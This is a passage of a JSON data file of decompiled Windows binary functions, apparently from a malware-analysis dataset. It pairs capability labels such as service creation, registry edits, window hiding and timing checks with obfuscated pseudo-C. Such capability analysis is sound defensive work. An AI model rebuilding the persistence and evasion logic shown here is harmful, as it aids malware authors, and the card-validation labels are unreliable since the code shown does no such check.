CONCAT44(in_EDX, uVar4);\n            }\n            var_8h[10] = -0x2d;\n            uStack16 = in_EAX;\n            uStack16 = uStack16 ^ unaff_EBX;\n            var_8h[0xb] = -0x4e;\n            if ((uStack16 < 1) || (0 < uStack16)) {\n                var_8h[0xc] = '2';\n            }\n            else {\n                in_EAX = in_EAX | 0x32;\n            }\n            bVar13 = (POPCOUNT(in_EDX + 0xaf) & 1U) != 0;\n            var_8h[0xd] = -0x70;\n            if ((bVar13) && (!bVar13)) {\n                puVar9 = &uStack16;\n                cVar2 = '\\x1e';\n                do {\n                    unaff_EBP = unaff_EBP + -1;\n                    puVar9 = puVar9 + -1;\n                    *puVar9 = *unaff_EBP;\n                    cVar2 = cVar2 + -1;\n                } while ('\\0' < cVar2);\n                uVar4 = in(0x78);\n                return CONCAT44(in_EDX, uVar4);\n            }\n            var_8h[0xe] = 'H';\n            bVar13 = (in_EDX ^ uVar12 | 0x67) < '\\0';\n            var_8h[0xf] = 'W';\n            if (((!bVar13) && (bVar13)) || (var_8h[0x10] = 'x',  pcVar10 = var_8h,  !bVar13)) {\n                var_8h[0xf] = var_8h[0xf] + uVar12;\n                *unaff_EBX = in_DS;\n                *var_8h = *var_8h + var_8h;\n                pcVar1 = in_EAX + 0x53;\n                cVar2 = *pcVar1;\n                cVar5 = var_8h >> 8;\n                *pcVar1 = *pcVar1 + cVar5;\n                uVar3 = in_EDX & 0xffff0000;\n                in_EDX = uVar3 | pcStack12 >> 0x10;\n                pcVar10 = in_EAX + 1;\n                if (SCARRY1(cVar2, cVar5) != *pcVar1 < '\\0') {\n                    out(0xc4, var_8h);\n                    in_EDX = uVar3 | pcStack12 >> 0x10 & 0xff00 | pcStack12 >> 0x10 ^ in_ECX;\n                    *ppcVar11 = var_8h;\n                }\n            }\n            pcVar10[0x11] = 'Y';\n            puVar9 = unaff_EBP[3];\n            *puVar9 = 0x12;\n            return CONCAT44(in_EDX, puVar9);\n        }\n        uVar12 = 9 < (in_EAX & 0xf) | in_AF;\n        in_AF = uVar12;\n        if (in_ECX != 0) {\n            do {\n    // WARNING: Do nothing block with infinite loop\n            } while( true );\n        }\n    } while( true );\n}\n",
        "token_count": 2219
    },
    "004031a0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004031f1) overlaps instruction at (ram,0x004031ee)\n// \n// WARNING: Removing unreachable block (ram,0x004031cf)\n// WARNING: Variable defined which should be unmapped: var_67h\n\nvoid __cdecl fcn.004031a0(uint *arg_8h, uint *arg_ch)\n\n{\n    int32_t iVar1;\n    uint extraout_EDX;\n    uint arg_ch_00;\n    uint unaff_EDI;\n    uint *puVar2;\n    bool bVar3;\n    uchar var_68h;\n    uint var_67h;\n    uint var_4h;\n    \n    var_4h = 0;\n    _var_68h = _var_68h & 0xffffff00;\n    puVar2 = &var_67h;\n    for (iVar1 = 0x18; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    *puVar2 = 0;\n    *(puVar2 + 2) = 0;\n    bVar3 = true;\n    fcn.00402fa0(&var_68h, &var_4h, unaff_EDI, _var_68h);\n    arg_ch_00 = var_4h;\n    if ((!bVar3) && (bVar3)) {\n        arg_ch_00 = extraout_EDX;\n    }\n    fcn.00403fd0(&var_68h, arg_ch_00, 0x406014, 0xa360);\n    *arg_8h = 0x406014;\n    *arg_ch = 0xa360;\n    return;\n}\n",
        "token_count": 390
    },
    "00403280": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004032ba) overlaps instruction at (ram,0x004032b6)\n// \n\nvoid __cdecl fcn.00403280(uint arg_8h, uint arg_ch)\n\n{\n    char cVar1;\n    code *pcVar2;\n    int32_t in_ECX;\n    int32_t unaff_EBX;\n    int32_t *piVar3;\n    uint *puVar4;\n    int32_t *piVar5;\n    int32_t *piVar6;\n    bool bVar7;\n    bool in_ZF;\n    bool bVar8;\n    int32_t aiStack20 [2];\n    \n    aiStack20[1] = unaff_EBX;\n    piVar5 = &stack0xfffffffc;\n    if (in_ZF) goto code_r0x00403294;\n    piVar5 = &stack0xfffffffc;\n    puVar4 = &stack0xfffffffc;\n    if (!in_ZF) goto code_r0x00403294;\ncode_r0x00403290:\n    piVar3 = aiStack20 + 1;\n    piVar5 = aiStack20 + 1;\n    cVar1 = '\\x10';\n    do {\n        puVar4 = puVar4 + -1;\n        piVar3 = piVar3 + -1;\n        *piVar3 = *puVar4;\n        cVar1 = cVar1 + -1;\n        aiStack20[1] = unaff_EBX;\n    } while ('\\0' < cVar1);\ncode_r0x00403294:\n    piVar3 = piVar5[3];\n    piVar6 = NULL;\n    bVar7 = false;\n    bVar8 = piVar3 == NULL;\n    if (bVar8) {\n        return;\n    }\n    unaff_EBX = piVar5[2];\n    do {\n        if ((bVar7) || (!bVar7)) {\n            pcVar2 = (*_sym.imp.MSVCRT.dll_rand)();\n        }\n        else {\n            in_ECX = in_ECX + -1;\n            puVar4 = piVar5;\n            if (in_ECX != 0 && bVar8) goto code_r0x00403290;\n            *piVar3 = piVar6 + 1;\n            piVar6 = 0xffb8ec44;\n            pcVar2 = sym.imp.MSVCRT.dll_rand + bVar7 + *0x9750e2b5;\n        }\n        in_ECX = 0x1a;\n        *(piVar6 + unaff_EBX) = pcVar2 % 0x1a + 'a';\n        piVar6 = piVar6 + 1;\n        bVar7 = piVar6 < piVar3;\n        bVar8 = piVar6 == piVar3;\n        if (!bVar7) {\n            return;\n        }\n    } while( true );\n}\n",
        "token_count": 637
    },
    "004034e0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "create or open registry key"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00403580) overlaps instruction at (ram,0x0040357d)\n// \n// WARNING: Removing unreachable block (ram,0x00403571)\n\nbool __cdecl fcn.004034e0(char *arg_8h, char *arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    char *in_ECX;\n    char *in_EDX;\n    char *unaff_EDI;\n    bool in_CF;\n    bool in_ZF;\n    bool bVar3;\n    bool in_OF;\n    ushort in_stack_fffffff0;\n    uint *puVar4;\n    char *var_4h;\n    \n    if (in_OF) {\ncode_r0x0040350e:\n        puVar4 = &var_4h;\n        in_EDX = arg_8h;\n    }\n    else {\n        puVar4 = CONCAT22(in_EDX, in_stack_fffffff0);\n        if (!in_OF) goto code_r0x0040350e;\n        cVar1 = in(in_EDX);\n        *unaff_EDI = cVar1;\n        arg_ch = in_ECX;\n        unaff_EDI = unaff_EDI + 1;\n        if (!in_CF && !in_ZF) {\n            bVar3 = true;\n            puVar4 = 0x47;\n            goto code_r0x00403583;\n        }\n    }\n    *unaff_EDI = *unaff_EDI + arg_ch;\n    *in_EDX = *in_EDX + (arg_ch >> 8);\n    var_4h = in_ECX;\n    iVar2 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyExA)(in_EDX, arg_ch, &stack0xfffffffc, 0x56);\n    if (iVar2 != 0) {\n        return false;\n    }\n    iVar2 = (*_sym.imp.ADVAPI32.dll_RegQueryValueExA)(var_4h, arg_10h, 0, arg_14h, arg_18h, arg_1ch);\n    bVar3 = iVar2 == 0;\n    in_EDX = var_4h;\ncode_r0x00403583:\n    (*_sym.imp.ADVAPI32.dll_RegCloseKey)(in_EDX, puVar4);\n    return bVar3;\n}\n",
        "token_count": 536
    },
    "00403a80": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00403bf2) overlaps instruction at (ram,0x00403bee)\n// \n// WARNING: Removing unreachable block (ram,0x00403bda)\n// WARNING: Removing unreachable block (ram,0x00403b39)\n// WARNING: Removing unreachable block (ram,0x00403acd)\n\nvoid __cdecl fcn.00403a80(uchar *arg_8h, uint arg_ch)\n\n{\n    char cVar1;\n    uint8_t uVar2;\n    uint8_t *in_EAX;\n    int16_t in_CX;\n    int32_t *in_EDX;\n    uint8_t uVar3;\n    uint unaff_EBX;\n    uint *puVar4;\n    uint *puVar5;\n    uchar *puVar6;\n    uchar *puVar7;\n    uint8_t **unaff_EDI;\n    uint8_t in_AF;\n    bool bVar8;\n    bool bVar9;\n    bool bVar10;\n    unkbyte10 in_ST0;\n    uint uStack24;\n    \n    puVar4 = &stack0xfffffffc;\n    bVar8 = (in_EDX & 0x66) != 0;\n    *arg_8h = 0xbb;\n    puVar6 = &stack0xfffffffc;\n    if ((bVar8) && (puVar6 = &stack0xfffffffc,  !bVar8)) {\n        puVar5 = &stack0xffffffec;\n        puVar6 = &stack0xffffffec;\n        cVar1 = '\\x10';\n        do {\n            puVar4 = puVar4 + -1;\n            puVar5 = puVar5 + -1;\n            *puVar5 = *puVar4;\n            cVar1 = cVar1 + -1;\n        } while ('\\0' < cVar1);\n    }\n    arg_8h[1] = 0x71;\n    arg_8h[2] = 0xdc;\n    arg_8h[3] = 0xe6;\n    bVar8 = (in_CX - 5 & 0x44) != 0;\n    arg_8h[4] = 0x13;\n    if ((bVar8) && (!bVar8)) {\n        do {\n    // WARNING: Do nothing block with infinite loop\n        } while( true );\n    }\n    arg_8h[5] = 0x20;\n    arg_8h[6] = 0xee;\n    arg_8h[7] = 0x90;\n    arg_8h[8] = 0xb4;\n    bVar8 = ((in_CX + 1U & 0xff | (in_CX + 1U >> 8 & in_EAX + 2U) << 8) & 0x7bc9) != 0;\n    arg_8h[9] = 0x9a;\n    puVar7 = arg_8h;\n    if ((bVar8) && (!bVar8)) {\n        in_EAX = in_EAX & 0xffffff00 | *0x4bb148d3;\n        puVar7 = arg_8h + 1;\n        out(*arg_8h, in_EDX & 0xffff);\n    }\n    puVar7[10] = 0xa7;\n    puVar7[0xb] = 0x37;\n    bVar8 = false;\n    bVar10 = false;\n    bVar9 = (in_EAX ^ unaff_EBX) < 0;\n    puVar7[0xc] = 0x8f;\n    if ((!bVar9) && (bVar9)) {\n        out(0xc4, in_EAX);\n        in_EDX = in_EDX & 0xffffff00 | in_EDX & 0xffff ^ in_CX;\n        *unaff_EDI = in_EAX;\n        uVar3 = unaff_EBX >> 8;\n        bVar8 = uVar3 < *in_EAX;\n        bVar10 = SBORROW1(uVar3, *in_EAX);\n        bVar9 = uVar3 - *in_EAX < '\\0';\n    }\n    puVar7[0xd] = 0xe0;\n    if ((bVar10 == bVar9) && (bVar10 != bVar9)) {\n        *(in_EAX + -0x7ce92414) = in_ST0;\n        *in_EDX = *in_EDX + 0x46c6df84;\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    }\n    puVar7[0xe] = 0x8e;\n    if ((bVar10 != bVar9) || (bVar10 == bVar9)) {\n        in_EAX = *(puVar6 + 0xc);\n    }\n    *(in_EAX + -0x7ce92414) = in_ST0;\n    uVar2 = in_EAX + -1;\n    uVar3 = 9 < (uVar2 & 0xf) | in_AF;\n    uVar2 = uVar2 + uVar3 * '\\x06';\n    *in_EDX = *in_EDX + 0x458bdf84;\n    *(in_EAX + -1 & 0xffffff00 | uVar2 + (0x90 < (uVar2 & 0xf0) | bVar8 | uVar3 * (0xf9 < uVar2)) * '`' | 0x5f) = 0xf;\n    return;\n}\n",
        "token_count": 1238
    },
    "00403c20": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00403c4e)\n\nvoid __cdecl fcn.00403c20(uint *arg_8h, uint *arg_ch)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uchar var_68h;\n    uint var_67h;\n    uint var_4h;\n    \n    var_4h = 0;\n    var_68h = 0;\n    puVar2 = &var_67h;\n    for (iVar1 = 0x18; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    *puVar2 = 0;\n    *(puVar2 + 2) = 0;\n    fcn.00403a80(&var_68h, &var_4h);\n    fcn.00403fd0(&var_68h, var_4h, 0x410374, 0x10000);\n    *arg_8h = 0x410374;\n    *arg_ch = 0x10000;\n    return;\n}\n",
        "token_count": 257
    },
    "00403cc0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00403cee) overlaps instruction at (ram,0x00403cec)\n// \n\nchar * __cdecl fcn.00403cc0(char *arg_8h, int32_t arg_ch, char *arg_10h, int32_t arg_14h)\n\n{\n    int32_t iVar1;\n    char *pcVar2;\n    char *pcVar3;\n    char *pcVar4;\n    bool bVar5;\n    \n    pcVar2 = arg_8h + (arg_ch - arg_14h);\n    bVar5 = arg_14h != 0;\n    if (bVar5) {\n        if ((bVar5) && (!bVar5)) {\n            *(arg_ch + 0x3b) = *(arg_ch + 0x3b) - &stack0xfffffff0;\n            return arg_8h;\n        }\n        if (arg_8h <= pcVar2) {\n            do {\n                if (*arg_8h == *arg_10h) {\n                    bVar5 = true;\n                    pcVar4 = arg_10h + 1;\n                    iVar1 = arg_14h;\n                    pcVar3 = arg_8h;\n                    do {\n                        pcVar3 = pcVar3 + 1;\n                        iVar1 = iVar1 + -1;\n                        if (iVar1 == 0) break;\n                        bVar5 = *pcVar3 == *pcVar4;\n                        pcVar4 = pcVar4 + 1;\n                    } while (bVar5);\n                    if (bVar5) {\n                        return arg_8h;\n                    }\n                }\n                arg_8h = arg_8h + 1;\n            } while (arg_8h <= pcVar2);\n        }\n        arg_8h = NULL;\n    }\n    return arg_8h;\n}\n",
        "token_count": 404
    },
    "00404350": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "set registry value",
            "delete registry key"
        ],
        "decompiled_code": "\nvoid fcn.00404350(void)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    uint unaff_ESI;\n    uint unaff_EDI;\n    uint *puVar4;\n    uint uStack332;\n    uint uStack328;\n    uint uStack324;\n    uint uStack320;\n    uint uStack316;\n    uint uStack312;\n    uint uStack308;\n    uint uStack304;\n    uchar *puStack300;\n    uchar *puStack296;\n    uchar uStack260;\n    uint uStack259;\n    \n    uStack260 = 0;\n    puVar4 = &stack0xfffffefd;\n    for (iVar3 = 0x40; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar4 = 0;\n        puVar4 = puVar4 + 1;\n    }\n    *puVar4 = 0;\n    *(puVar4 + 2) = 0;\n    fcn.00401810(unaff_EDI, unaff_ESI, 0);\n    puStack296 = 0x40439a;\n    fcn.00403280(&stack0xfffffeec, 5);\n    pcVar1 = _sym.imp.MSVCRT.dll_sprintf;\n    puStack296 = &stack0xfffffefc;\n    puStack300 = 0x4043b4;\n    (*_sym.imp.MSVCRT.dll_sprintf)();\n    puStack296 = 0x4043c7;\n    (*_sym.imp.SHLWAPI.dll_SHDeleteKeyA)();\n    pcVar2 = _sym.imp.SHLWAPI.dll_SHSetValueA;\n    puStack300 = &stack0xfffffee4;\n    puStack296 = 0x10;\n    uStack304 = 1;\n    uStack308 = 0x4208c4;\n    uStack312 = 0x4206d8;\n    uStack316 = 0x80000000;\n    uStack320 = 0x4043e7;\n    (*_sym.imp.SHLWAPI.dll_SHSetValueA)();\n    uStack320 = 0x4b;\n    uStack324 = 0x42070c;\n    uStack328 = 1;\n    uStack332 = 0x4208c4;\n    (*pcVar2)(0x80000000, &stack0xfffffedc);\n    (*pcVar1)(&stack0xfffffec4, 0x420758, &stack0xfffffeb4);\n    (*pcVar2)(0x80000000, &stack0xfffffec4, 0x420794, 1, 0x42079c, 0x14);\n    return;\n}\n",
        "token_count": 596
    },
    "00404440": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.00404440(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.MSVCRT.dll_rand)();\n    return iVar1 % 5 + 3;\n}\n",
        "token_count": 48
    },
    "004046f0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004046f0(uint arg_8h)\n\n{\n    uint hSCManager;\n    uint uVar1;\n    \n    hSCManager = (*_sym.imp.ADVAPI32.dll_OpenSCManagerA)(0, 0, 0xf003f);\n    uVar1 = fcn.004047e0(hSCManager, arg_8h);\n    (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(hSCManager);\n    return uVar1;\n}\n",
        "token_count": 107
    },
    "00404760": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "hide graphical window"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00404760(uint arg_8h)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.USER32.dll_CreateWindowExA)\n                      (0, 0x42088c, 0x4208c4, 0xcf0000, 0x80000000, 0, 0x80000000, 0, 0, 0, arg_8h, 0);\n    if (iVar1 == 0) {\n        return 0;\n    }\n    (*_sym.imp.USER32.dll_ShowWindow)(iVar1, 0);\n    return 1;\n}\n",
        "token_count": 140
    },
    "00404910": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "get service handle",
            "create service"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00404910(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.ADVAPI32.dll_CreateServiceA)(arg_8h, arg_ch, arg_ch, 0xf01ff, 1, 0, 1, arg_10h, 0, 0, 0, 0, 0);\n    if (iVar1 == 0) {\n        return 0;\n    }\n    (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(iVar1);\n    return 1;\n}\n",
        "token_count": 138
    },
    "00404050": {
        "rules": [
            "contain loop",
            "get common file path"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00404079)\n// WARNING: Removing unreachable block (ram,0x0040407f)\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nbool fcn.00404050(uint param_1, uint param_2, uint param_3, uint param_4)\n\n{\n    code *pcVar1;\n    uint arg_ch;\n    uint arg_ch_00;\n    uint arg_ch_01;\n    int32_t iVar2;\n    uint32_t unaff_EBX;\n    uint unaff_ESI;\n    uint unaff_EDI;\n    uint *puVar3;\n    uint32_t in_stack_fffffce5;\n    uchar auStack532 [260];\n    uchar var_10ch;\n    uint var_10bh;\n    int32_t var_8h;\n    int32_t iStack8;\n    \n    var_8h = 0;\n    var_10ch = 0;\n    puVar3 = &var_10bh;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    *puVar3 = 0;\n    *(puVar3 + 2) = 0;\n    fcn.00401810(CONCAT13(unaff_ESI, unaff_EDI >> 8), CONCAT13(unaff_EBX, unaff_ESI >> 8), \n                 in_stack_fffffce5 & 0xff000000 | unaff_EBX >> 8);\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)(&var_10ch, 0x104);\n    iStack8 = 0;\n    do {\n        arg_ch = fcn.00404440();\n        arg_ch_00 = fcn.00404440();\n        arg_ch_01 = fcn.00404440();\n        fcn.00403280(param_3, arg_ch);\n        fcn.00403280(param_1, arg_ch_00);\n        fcn.00403280(param_2, arg_ch_01);\n        pcVar1 = _sym.imp.MSVCRT.dll_sprintf;\n        (*_sym.imp.MSVCRT.dll_sprintf)(&stack0xfffffce8, 0x420394, &var_10ch, param_3);\n        iVar2 = fcn.00403a40(&stack0xfffffce8);\n        if (iVar2 != 0) {\n            (*pcVar1)(auStack532, 0x4203a0, &var_10ch, param_1);\n            iVar2 = fcn.00403a40(auStack532);\n            if (iVar2 != 0) {\n                (*pcVar1)(auStack532, 0x4203a0, &var_10ch, param_2);\n                iVar2 = fcn.00403a40(auStack532);\n                if (iVar2 != 0) {\n                    iVar2 = 1;\n                    break;\n                }\n            }\n        }\n        iStack8 = iStack8 + 1;\n        iVar2 = var_8h;\n    } while (iStack8 < 3);\n    fcn.00403280(param_4, 4);\n    return iVar2 != 0;\n}\n",
        "token_count": 729
    },
    "004011b0": {
        "rules": [
            "link function at runtime on Windows"
        ],
        "decompiled_code": "\nuint fcn.004011b0(void)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    int32_t unaff_EBX;\n    char in_AF;\n    bool bVar3;\n    uint hModule;\n    \n    uVar1 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(0x420474);\n    bVar3 = uVar1 == 0;\n    if (bVar3) {\n        return 0;\n    }\n    uVar2 = uVar1;\n    if ((!bVar3) && (bVar3)) {\n        if (unaff_EBX + 1 == 0) goto code_r0x00401228;\n        uVar2 = CONCAT11(in_AF, in_AF * '\\x06') & 0xff0f;\n        *(uVar2 + 0x2a) = *(uVar2 + 0x2a) - (unaff_EBX + 1);\n    }\n    *0x420894 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar2, 0x420484);\n    *0x420898 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar1, 0x4204a0);\ncode_r0x00401228:\n    *0x42089c = (*_sym.imp.KERNEL32.dll_GetProcAddress)();\n    if (((*0x420894 != 0) && (*0x420898 != 0)) && (*0x42089c != 0)) {\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 341
    },
    "00404990": {
        "rules": [
            "set registry value"
        ],
        "decompiled_code": "\nbool fcn.00404990(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.SHLWAPI.dll_SHSetValueA)(0x80000002, 0x420574, 0x4205b8, 4, &stack0x00000004, 4);\n    return iVar1 == 0;\n}\n",
        "token_count": 79
    },
    "004047e0": {
        "rules": [
            "get service handle",
            "start service"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004047e0(uint hSCManager, uint lpServiceName)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    iVar2 = (*_sym.imp.ADVAPI32.dll_OpenServiceA)(hSCManager, lpServiceName, 0xf01ff);\n    if (iVar2 == 0) {\n        return 0;\n    }\n    iVar3 = (*_sym.imp.ADVAPI32.dll_StartServiceA)(iVar2, 0, 0);\n    pcVar1 = _sym.imp.KERNEL32.dll_GetLastError;\n    if (((iVar3 == 0) && (iVar3 = (*_sym.imp.KERNEL32.dll_GetLastError)(),  iVar3 != 0x420)) &&\n       (iVar3 = (*pcVar1)(),  iVar3 != 0x422)) {\n        (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(iVar2);\n        return 0;\n    }\n    (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(iVar2);\n    return 1;\n}\n",
        "token_count": 237
    }
}